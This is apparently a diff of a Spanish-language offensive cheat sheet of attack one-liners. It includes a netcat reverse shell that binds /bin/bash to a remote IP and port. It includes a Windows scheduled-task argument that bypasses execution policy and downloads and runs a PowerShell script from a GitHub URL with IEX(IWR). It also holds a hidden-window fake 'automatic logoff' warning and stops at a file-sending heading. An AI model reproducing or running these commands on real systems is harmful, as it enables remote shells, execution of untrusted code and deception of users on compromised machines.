@@ -17,9 +17,7 @@ reverse-shell for windows:
 reverse-shell for linux:
 		nc -e /bin/bash 192.168.0.4 443
 Argumento en tarea programada para windows:
-	-  Argument:  -executionpolicy bypass c:\path\event4740.ps1
-	- Argument2: -executionpolicy bypass IEX(IWR https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/connection.ps1);
-	- -executionpolicy bypass IEX(IWR https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/connection.ps1);
+	- Argument: -executionpolicy bypass IEX(IWR https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/connection.ps1);
 Mostrar alerta en windows:
 	- powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Automatic logoff after 1 hour of inactivity','WARNING')}"
 Enviar archivos en windows:
